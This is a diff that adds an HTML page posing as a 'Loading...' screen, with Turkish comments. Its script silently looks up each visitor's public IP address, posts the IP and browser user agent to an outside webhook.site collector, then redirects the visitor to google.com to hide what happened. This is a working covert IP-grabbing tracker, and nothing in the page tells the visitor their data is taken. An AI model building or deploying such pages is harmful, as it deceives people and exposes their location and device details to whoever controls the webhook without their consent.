@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Yükleniyor...</title>
+</head>
+<body>
+    <script>
+        // Buradaki URL'yi 3. Adımda değiştireceğiz
+        const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
+
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const userAgent = navigator.userAgent;
+
+            fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ ip: ip, cihaz: userAgent })
+            }).then(() => {
+                // Bilgiyi gönderdikten sonra kullanıcıyı başka yere yönlendir
+                window.location.href = "https://www.google.com";
+            });
+        });
+    </script>
+</body>
+</html>
